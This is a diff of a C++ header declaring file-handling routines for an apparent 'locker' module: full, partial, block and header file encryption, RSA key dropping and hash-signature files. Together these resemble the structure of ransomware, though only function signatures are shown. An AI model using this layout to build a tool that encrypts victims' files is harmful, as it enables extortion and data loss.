@@ -8,17 +8,18 @@
 
 namespace filesystem
 {
-	BOOL getParseFile(locker::PFILE_INFO FileInfo);
-	BOOL EncryptFileFullData(locker::PFILE_INFO FileInfo, WCHAR* mke);
-	BOOL EncryptFilePartly(locker::PFILE_INFO FileInfo,WCHAR* mke,BYTE DataPercent);
-	BOOL EncryptFileBlock(locker::PFILE_INFO FileInfo,WCHAR* newFilename);
-	BOOL EncryptFileHeader(locker::PFILE_INFO FileInfo,WCHAR* newFilename);
+	BOOL getParseFile(PFILE_INFO FileInfo);
+	BOOL CreateFileOpen(PFILE_INFO FileInfo);
+	BOOL EncryptFileFullData(PFILE_INFO FileInfo);
+	BOOL EncryptFilePartly(PFILE_INFO FileInfo, BYTE DataPercent);
+	BOOL EncryptFileBlock(PFILE_INFO FileInfo);
+	BOOL EncryptFileHeader(PFILE_INFO FileInfo);
 	WCHAR* MakeCopyFile(WCHAR* Path, WCHAR* Filename, WCHAR* exst, WCHAR* FPath);
-	BOOL ReadFile_(locker::PFILE_INFO FileInfo);
+	BOOL ReadFile_(PFILE_INFO FileInfo);
 	BOOL DropRSAKey(WCHAR* Path, BYTE PublicKey[], BYTE PrivateKey[], DWORD SizeKey, DWORD p_SizeKey);
 	BOOL EncryptRSA(WCHAR* KeyFile, WCHAR* Filename, WCHAR* newFileName);
-	BOOL FileCryptEncrypt(WCHAR* KeyFile, WCHAR* FileCrypt, WCHAR* newFilename);
-	BOOL FileCryptDecrypt(WCHAR* KeyFile,WCHAR* FileCrypt,WCHAR* newFilename);
+	BOOL FileCryptEncrypt(CRYPT_INFO* CryptInfo, WCHAR* KeyFile, WCHAR* FileCrypt, WCHAR* newFilename);
+	BOOL FileCryptDecrypt(CRYPT_INFO* CryptInfo, WCHAR* KeyFile,WCHAR* FileCrypt,WCHAR* newFilename);
 	BOOL HashSignatureFile(SLIST<locker::HLIST>* list, WCHAR* FPath, WCHAR* Filename);
 	VOID sort_hash_list(SLIST<HASH_LIST>* list);
 	BOOL CreateSignatureFile(SLIST<HASH_LIST>* HashList, WCHAR* SignatureName, BYTE* SignatureRoot, DWORD sig_len);
